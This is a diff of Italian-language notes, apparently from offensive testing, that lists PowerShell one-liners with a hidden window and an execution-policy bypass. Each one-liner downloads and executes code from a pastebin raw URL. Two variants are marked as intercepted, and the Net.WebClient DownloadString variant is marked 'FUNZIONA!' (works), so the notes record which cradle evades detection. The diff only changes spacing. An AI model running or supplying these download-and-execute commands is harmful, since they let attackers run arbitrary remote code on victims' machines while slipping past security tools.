@@ -26,12 +26,12 @@ powershell -w h -NoP -NonI -ep Bypass -c iwr https://pastebin.com/raw/VGmUcTn6 |
 non funziona ma viene intercettato
 
 ```console
-powershell -w h -NoP -NonI -ep Bypass -c iex((iwr https://pastebin.com/raw/VGmUcTn6).content) 
+powershell -w h -NoP -NonI -ep Bypass -c iex ((iwr https://pastebin.com/raw/VGmUcTn6).content) 
 ```
 non funziona ma viene intercettato
 
 ```console
-powershell -w h -NoP -NonI -ep Bypass -c "iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/VGmUcTn6')"
+powershell -w h -NoP -NonI -ep Bypass -c "iex (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/VGmUcTn6')"
 ```
 **FUNZIONA!**
 
